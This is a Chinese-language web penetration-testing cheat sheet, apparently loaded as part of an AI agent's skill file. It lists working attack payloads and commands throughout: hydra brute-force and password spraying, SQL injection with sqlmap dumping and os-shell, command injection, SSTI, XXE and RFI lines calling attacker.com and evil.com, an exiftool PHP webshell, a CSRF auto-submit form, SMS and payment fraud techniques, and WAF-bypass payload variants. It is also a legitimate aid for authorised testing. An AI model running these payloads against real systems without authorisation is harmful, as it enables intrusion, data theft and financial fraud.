# Web 漏洞测试速查（web-vulns）

> 来源：jiejieskill SKILL.md 拆分（2026-08-11）。由 SKILL.md 相应章节按需加载。

### 6.1 OWASP Top 10 系统性测试总览

> 作为漏洞分析的**总纲**：先自动扫描快跑一遍，再按表逐项人工验证。每个 Top10 项至少做一次「正向 + 绕过」验证。

| Top10 2021 | 漏洞类别 | 本 skill 测试章节 |
|-----------|---------|------------------|
| A01 失效的访问控制 | 越权 / IDOR / 提权 | 越权测试专项 |
| A02 加密失败 | 明文传输 / 弱加密 / 硬编码密钥 | 加解密与国密测试 |
| A03 注入 | SQL / XSS / 命令注入 / SSTI | Web 应用测试清单（注入类） |
| A04 不安全设计 | 业务逻辑 / 竞态 / 支付 | 业务逻辑漏洞测试 |
| A05 安全配置错误 | 未授权 / 默认口令 / 调试接口 | 未授权访问、中间件章节 |
| A06 易受攻击组件 | 中间件 / 框架 Nday | 中间件 / 反序列化章节 |
| A07 认证与识别失败 | 爆破 / 会话 / 短信验证码 | 认证全流程测试 |
| A08 软件与数据完整性失败 | 反序列化 | 中间件-反序列化 |
| A09 安全日志监控失败 | 日志泄露 / 无审计 | 信息泄露、报告建议 |
| A10 SSRF | 服务端请求伪造 | Web 应用测试清单-SSRF |

```bash
# 自动扫描先行（快速定位）
nuclei -u $URL -t cves/ -t exposures/ -t misconfiguration/ -severity critical,high,medium
nikto -h $URL
ffuf -u $URL/FUZZ -w raft-large-words.txt          # 目录/敏感文件
# 再按表格逐项手工验证关键发现
```

### 6.2 Web 应用测试清单 (OWASP WSTG)

#### 身份验证测试
```bash
# 用户名枚举
# 观察登录失败差异（响应长度、时间、错误消息）

# 暴力破解
hydra -l admin -P rockyou.txt <target_ip> http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
hydra -L users.txt -p Spring2025! <target_ip> http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"  # 密码喷射

# MFA 绕过测试
# → 直接访问内部页面跳过MFA
# → 修改响应中的 "mfa_required": true → false
# → 暴力破解6位MFA码
# → 检查是否可无限尝试
```

#### 会话管理
```bash
# Cookie 分析
# → 检查 Secure / HttpOnly / SameSite 标志
# → 会话固定攻击：登录前后session是否变化
# → JWT 攻击

# JWT 测试
jwt_tool <token>                           # 分析
jwt_tool <token> -X s                      # 自动测试
# 手动：alg=none, RS256→HS256, kid注入
```

#### 越权 / 授权漏洞（IDOR / BOLA / BFLA）
```bash
# ========= 水平越权（改对象 ID，访问他人数据）=========
# IDOR（不安全直接对象引用）
/api/user/1234/orders → /api/user/1235/orders      # 遍历他人订单
/api/order/1001 → /api/order/1002
# 对象参数不止数字：UUID、文件名、邮箱、手机号、base64 编码 ID 都要测

# ========= 垂直越权（普通用户访问管理功能）=========
# 修改角色/权限参数
role=user → role=admin / is_admin=1 / member_type=vip
# 直接访问管理端点（绕过前端菜单隐藏）
GET /api/admin/users /admin/console
# 方法混淆：GET→POST / PATCH / DELETE 是否绕过权限中间件

# ========= API / 批量越权（高频）=========
# 集合接口只校验第一个元素
POST /api/batch {"ids":[1234,1235,1236]}
# 扩展字段：fields/include/expand/select 带出未授权字段
/api/user/1?fields=password,card_no
# 方法隧道：X-HTTP-Method-Override: PATCH / _method=PATCH
# 参数污染：id=1&id=2（后端取第 2 个 → 越权）
# 跨协议：REST 改 GraphQL/WebSocket 再测（授权中间件常不一致）
# 批量：POST 改 GET / 单改多

# ========= 自动化 =========
# Burp Intruder：遍历 ID 范围 → 响应分组对比
# Autorize 插件：低/高权限响应一键对比
# AuthMatrix / AutoRepeater：批量越权
# 规则：A 账号登录拿 token → 访问 B 账号资源 → 响应含 B 数据即越权
```

#### 注入类漏洞
```bash
# SQL Injection
' OR '1'='1' --
admin' --
' UNION SELECT 1,2,3,@@version,5-- -
' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables-- -

sqlmap -u "http://target.com/page.php?id=1" --dbs --batch
sqlmap -r request.txt -D dbname --tables --batch
sqlmap -r request.txt -D dbname -T users --dump --batch
sqlmap -r request.txt --os-shell                               # 写Webshell

# ⚠️ 数据库类型识别（选对语法，先判 DB 再选函数）
#   MSSQL：TOP 1 / substring() / @@version / 表名大写 / -- 注释
#   MySQL：LIMIT 1 / SUBSTRING() / @@version / # 或 -- 注释
#   Oracle：ROWNUM / SUBSTR() / DUAL / -- 注释
#   报错回显的 SQL 语句直接暴露 DB 类型（TOP 1 vs LIMIT），别用错函数
#   登录框 SQLi 专项（认证绕过 + 弱口令探针 + 盲注拖密码表）→ 见 auth-testing.md 6.3
#   AND 优先级陷阱：' or '1'='1 + 密码P = 弱口令探针（P 命中任一真实密码即绕过）

# XSS
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><svg onload=alert(1)>
<iframe src="javascript:alert(1)">
# DOM XSS: 检查JS中不安全的DOM操作

# Command Injection
; whoami
| whoami
`whoami`
$(whoami)
&& whoami
|| whoami
\n whoami

# SSTI (模板注入)
{{7*7}}
${7*7}
<%= 7*7 %>
{{config.items()}}
{{''.__class__.__mro__[2].__subclasses__()}}

# XXE
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
# OOB: <!ENTITY xxe SYSTEM "http://attacker.com/xxe">

# SSRF
http://169.254.169.254/latest/meta-data/      # AWS
http://metadata.google.internal/               # GCP
http://100.100.100.200/latest/meta-data/       # 阿里云
file:///etc/passwd
http://127.0.0.1:8080/admin
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a...

# CRLF 注入（响应头注入 / 日志注入 / 响应拆分）
# 参数值追加 %0d%0a 或 %0a，观察响应是否新增头/拆分
%0d%0aSet-Cookie:evil=1          # 注入 Cookie 头（会话固定辅助）
%0d%0a%0d%0a<html>...            # 响应拆分 → 伪造响应体
# 检测：url 参数 ?u=http://target/%0d%0aX-Test:1 → 响应头出现 X-Test 即存在
# 场景：Location 重定向参数、日志记录点（UA/用户名注入日志 → 日志投毒）

# XPATH 注入（XML 数据库查询注入）
' or '1'='1
' or 1=1
' ] | //user[1] | //*[1]
admin' or '1'='1' or '
# 盲注：' or count(/*)=1 or ' ；子串判断 ' or substring(name(/*[1]),1,1)='a' or '
# 检测：登录/搜索走 XML 查询的参数 → 注入 XPath 表达式看回显差异/报错

# 链接注入 / 框架注入
<iframe src="http://evil.com">
<frame src="javascript:alert(1)">
# 参数值直接拼进 iframe/frame src → 引入外部页面（钓鱼/点击劫持/挂马）

# 文件包含 LFI / RFI
?file=../../../../etc/passwd
?file=....//....//....//etc/passwd       # 双写绕过过滤
?file=php://filter/convert.base64-encode/resource=index.php   # 读源码
?file=php://input                        # POST 写 shell（需 allow_url_include）
?file=/var/log/apache2/access.log        # 日志包含（先写日志再包含）
?file=/proc/self/environ                 # 环境变量包含
?file=http://evil.com/shell.txt          # RFI（需 allow_url_fopen）
# 检测：file/page/include/path/read 参数 → 路径穿越读文件；伪协议/日志/会话包含 getshell
# 工具：lfi_suite / Burp Intruder 遍历常见路径
```

#### 文件上传
```bash
# 绕过测试矩阵
.php → .php5, .phtml, .phar, .shtml, .php.jpg
.php → .PhP, .pHp (大小写)
.php → .php%00.jpg (空字节)
.php → .php. . (Windows尾空格)

# 内容类型绕过
Content-Type: application/x-php → image/jpeg

# 图片马
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

#### 业务逻辑漏洞（含金融交易逻辑）
```bash
# 通用逻辑
# 越权/参数篡改
修改价格参数: price=1000 → price=1
修改数量: quantity=-1
修改优惠券: discount_code=NULL/EMPTY
# 竞态条件（并发请求）
# 工作流绕过（跳过支付步骤）
# 无限OTP尝试

# 金融交易逻辑（银行/支付/电商重点）
# 1. 金额篡改：负数、0.01、精度截断、前后端字段不一致
#    amount=-100 / amount=0.01 / 前端算价后端不重算
# 2. 重放：重复提交同一笔转账/支付回调（未幂等）
# 3. 竞态（TOCTOU）：并发提交转账/提现（Turbo Intruder 多线程）
#    扣款与入账解耦 → 重复入账/重复出款
# 4. 幂等缺陷：扣款成功但订单状态未更新 → 可反复触发出款
# 5. 支付回调校验：只验 IP 不验签名 / 签名算法可绕过 / 参数拼接注入
# 6. 第三方对接：MD5/SHA1 弱签名、secret 硬编码、金额/商户号后端未校验

# MFA / OTP 绕过（金融高发）
# 流程跳步：跳过 MFA 步骤直达敏感操作
# 改响应：mfa_required:true → false
# OTP 爆破：6 位码无限制尝试
# OTP 未绑定会话：A 会话的验证码 B 会话可用
# OTP 重放：同一验证码多次使用

# 并发登录（单点登录/多端会话）
# 同账号多设备并发登录：是否互踢/告警/限流
# 会话互踢逻辑缺陷：A 登录踢 B，B 的旧 session 仍有效 → 会话复用
# 检测：两设备同时登录同一账号 → 看旧会话是否失效、是否有异地登录告警

# 短信定向转发（改收件人）
# 发送接口 receiver/mobile 参数可控 → 验证码/通知发到攻击者手机号
# 改包 mobile=<测试手机号> → mobile=攻击者手机号 → 重置/登录验证码被劫持

# 邮件炸弹 / 邮件定向转发
# 邮件发送接口无次数限制 → 同一邮箱无限触发（骚扰/资源耗尽）
# 收件人参数 email/to 可控 → 重置链接/验证码发到自己邮箱（改 email 参数）

# 正负值对冲（绕过余额/对账）
# 两账号/两笔交易正负抵消：A 转 B 正数、B 转 A 负数 → 实际套利不扣款
# 检测：批量提交正负金额交易 → 看总账是否被绕过

# 任意短信内容发送
# 短信接口 content 参数可控 → 伪造官方短信（钓鱼/诈骗）发任意号码
# 改包：短信模板 ID 或 content 字段改为攻击者内容 → 发到任意手机号

# 恶意锁定（账号锁定 DoS）
# 错误次数锁定机制被滥用：批量错误登录锁死他人账号（拒绝服务）
# 锁定绕过：锁定后改 IP/UA/手机号是否继续尝试（枚举辅助）
```

#### 客户端攻击（CSRF / 不安全 HTTP 方法）
```bash
# CSRF（跨站请求伪造）
# 状态改变操作（改密/转账/关注/删除）无 token/Referer/SameSite 校验
# 检测：抓包看操作请求是否有 CSRF token；删/改 Referer 看是否仍生效
# 利用：构造恶意 HTML 诱导受害者点击 → 以受害者身份执行操作
#   <form action="http://target/change_pass" method="POST">
#     <input name="newpass" value="hacked">
#   </form><script>document.forms[0].submit()</script>
# 绕过：token 与 cookie 绑定弱、Referer 校验可空、SameSite=None、JSON 请求跨域

# 不安全的 HTTP 方法
# OPTIONS 探测允许的方法
curl -X OPTIONS -i http://target/        # Allow 头列出方法
# PUT 写文件（WebDAV）：curl -X PUT -d "shell" http://target/shell.txt
# DELETE 删资源；TRACE（XST 反射 XSS）；MOVE/COPY 越权
# 危害：PUT 上传 webshell、TRACE 窃取 cookie、DELETE 破坏数据
```

#### 信息泄漏类（目录浏览/图片遍历/后台暴露/备份/敏感信息等）
```bash
# 目录浏览
# 目录无 index 文件 → 直接列出文件列表（Index of /）
curl -s http://target/uploads/          # 返回目录列表即存在
# 探测：ffuf -w common.txt 找目录 → 命中后直接访问看是否列目录

# 图片遍历
# 图片/附件 ID 可枚举 → 遍历他人头像/证件/私密图
/avatar/1.jpg → /avatar/2.jpg → /avatar/3.jpg
# Burp Intruder 遍历 ID → 响应 200 且非通用默认图即越权泄露

# 后台地址暴露
# 后台路径从前端 JS/robots/常见路径猜出
# 常见：/admin /manage /system /login.jsp /console /backend
# 探测：ffuf -w 后台字典；grep JS 里的 admin 路径；看 robots.txt Disallow

# PHPInfo 信息泄漏
# 探测：/phpinfo.php /info.php /test.php /php_info.php
# 危害：绝对路径、PHP 版本、扩展、环境变量、内网 IP
# ⚠️ 拿到 phpinfo 必查两个「RCE 判定」关键字段：
#   ① disable_functions = "no value"（空）→ system/exec/passthru/shell_exec 全部可用
#      → 只要再拿到任意代码执行入口（文件上传/文件包含/模板注入/写 shell），即直接 RCE
#      → 反之 disable_functions 列了一长串（passthru,exec,system...）才需要考虑绕过（LD_PRELOAD/GCONV）
#   ② SERVER_ADDR / SERVER_NAME / DOCUMENT_ROOT / SCRIPT_FILENAME
#      → 泄露内网 IP（如 192.168.3.16）、绝对路径 /var/www/html、管理员邮箱
#   ③ allow_url_include=On → 直接 RFI；register_globals=On（老 PHP）→ 变量覆盖
#   字段提取：curl -s phpinfo.php | grep -iE 'disable_functions|SERVER_ADDR|DOCUMENT_ROOT|allow_url_include'
#   本例：disable_functions 空 + 内网 192.168.3.16 + DOCUMENT_ROOT /var/www/html

# .SVN / .git 信息泄露
curl http://target/.svn/entries
curl http://target/.git/config
# .git 泄露 → 工具重建源码：githacker / GitHack / dvcs-ripper
githack http://target/.git/

# 备份文件泄漏
# 源码/配置备份可下载
ffuf -u http://target/FUZZ -w 文件字典 -e .bak,.old,.swp,.zip,.tar.gz,.sql,.tmp,~
curl http://target/www.zip ; curl http://target/index.php.bak

# 内网 IP 泄漏
# 响应/JS/报错/重定向（Location）泄露 10.x/192.168/172.x 内网 IP
# 抓包看 Location 头、报错页、JS 里的内网 IP/主机名 → 内网拓扑 → 后续 SSRF/内网靶标

# 敏感信息泄露
# 报错堆栈/注释/源码/响应头/调试信息泄露密钥/路径/账号
# 触发报错看堆栈；grep JS 注释里的 key/secret/token；/actuator 端点

# Robots 信息泄露
curl http://target/robots.txt        # Disallow 列出敏感目录/后台
# robots.txt / sitemap.xml → 提取隐藏路径 → 逐个访问
```

### 6.9 WAF 检测与绕过

> 国内目标大概率套 WAF。**先识别 WAF，再决定注入/上传用什么姿势**，否则一个封禁 IP 整个测试断掉。

#### WAF 检测
```bash
wafw00f http://target.com               # 自动识别类型
# 手工：提交恶意请求（/etc/passwd、单引号）看响应
#   → 403/423 拦截页、出现"拦截/防护"文案、响应头有 WAF 特征
```

#### 常见 WAF 识别表

| WAF | 类型 | 识别特征 |
|-----|------|---------|
| 阿里云盾 | 云WAF | 拦截页 403"抱歉"，Server 含 `Tengine`/`aliyun` |
| 腾讯云 WAF | 云WAF | 拦截页含"腾讯云"，`waf` cookie |
| 百度云加速 | 云WAF | `Yunjiasu-*` 响应头 |
| 360网站卫士 | 云WAF | 拦截页 360 字样，`360wzws` |
| 安全狗 | 软件WAF | 拦截页"安全狗" |
| 云锁 | 软件WAF | 拦截页"云锁" |
| 长亭雷池 | 软件WAF | 拦截页含 `SafeLine` |
| 宝塔防火墙 | 软件WAF | 拦截页"宝塔"，`btwaf` cookie |

#### 绕过手法速查（由浅入深）
```bash
# 1. 大小写 / 关键字替换（针对简单正则）
Union Select → uNiOn SeLeCt
and 1=1 → && 1=1    (URL编码 %26%26)    # or 1=1 → || 1=1 (%7C%7C)
order by → group by / having

# 2. 注释拆分（MySQL 内联注释 = 关键字）
/*!50000union*/ /*!50000select*/ 1,2,3
uni/**/on sel/**/ect                     # 注释插关键字中间

# 3. 编码混淆
# 二次URL编码 %25→%27；十六进制 0x61646d696e；Unicode(IIS) %u0061dmin
# JSON/Base64 包裹再注入

# 4. 等价替换
information_schema → sys.schema / performance_schema
sleep(1) → benchmark(10000000,sha1(1))   # 绕过 sleep 关键字检测
'1'='1 → '1' IN '1' / '1' LIKE '1' / '1' BETWEEN '1' AND '1'

# 5. 参数污染 HPP（WAF查第一个，后端取最后一个）
id=1&id=2 union&id=select 1,2
# 数组污染：id[]=1&id[]=union select ...

# 6. Content-Type 切换（绕过不解析的规则引擎）
# 改 application/json / multipart/form-data / text/xml 再注入
# 7. 分块传输 Chunked（核心绕过手法）
#   Transfer-Encoding: chunked 分块拆分 payload
#   Burp 插件：chunked-coding-converter 一键转换
# 8. 超长 / 畸形请求截断：超长参数使 WAF 正则引擎超时/截断
# 9. 白名单路径：/static/xxx.php?...  → 部分 WAF 放行静态后缀
# 10. 组合叠加：大小写+编码+注释 层层组合最稳
```

```bash
# SQLi 绕过示例（以 union select 为例）
/*!50000union*/%09/*!50000select*/%09 1,2,group_concat(table_name)%09from%09information_schema.tables%09where%09table_schema=database()
id=1%2527%20un%69on%20sel%65ct%201,2,3--      # 二次编码 + 大小写

# XSS 绕过示例
<scr<script>ipt>alert(1)</scr</script>ipt>   # 标签拆解
<img src=x onerror=&#97;lert(1)>              # HTML实体编码
%3Cscript%3Ealert(1)%3C/script%3E             # URL编码
<svg/onload=alert`1`>                          # 无括号调用
```

> 🔗 **WAF 绕过深度 payload 库 → secknowledge 技能 `references/web-sqli.md`、`web-xss.md`**；上传绕过矩阵见 6.2 Web 应用测试清单「文件上传」块、`input-upload-js.md` 6.4 输入框/上传下载专项。


### OWASP API Top 10（API 渗透专项清单）

> API 是现代 Web 的核心攻击面，**越权（BOLA/BFLA）是最常见且最严重**的一类。配合上方 6.2 越权/注入章节使用。

| API Top10 2023 | 漏洞 | 测试要点 |
|---------------|------|---------|
| API1 BOLA | 对象级越权 | 改 ID/资源标识符访问他人数据 |
| API2 BFLA | 功能级越权 | 低权限访问管理端点/功能 |
| API3 未限流 | 资源耗尽 | 登录/OTP/支付爆破、云成本烧钱 |
| API4 资源消耗 | 数据量大 | 分页未限制、批量拉取 |
| API5 失效认证 | 认证缺陷 | token 失效/重放/JWT 攻击 |
| API6 敏感数据暴露 | 过度暴露 | 响应含多余字段、未脱敏 |
| API7 SSRF | 服务端请求伪造 | URL 参数、回调地址 |
| API8 安全配置错误 | 配置缺陷 | CORS/安全头/调试接口 |
| API9 库存管理 | 影子 API | 未文档化端点、旧版本接口 |
| API10 不安全消费 | 供应链 | 第三方 API 数据未校验 |

```bash
# API 专项测试命令
# 端点发现：swagger/api-docs/openapi 泄露
curl -s $URL/swagger-ui.html /v3/api-docs /api-docs
# 越权自动化：Autorize（低/高权限响应对比）
# 方法混淆：GET/POST/PATCH 权限不一致
# 批量接口：只校验第一个元素
# 参数污染：id=1&id=2 后端取第 2 个
# 详见本文件 6.2 越权/授权漏洞块
```
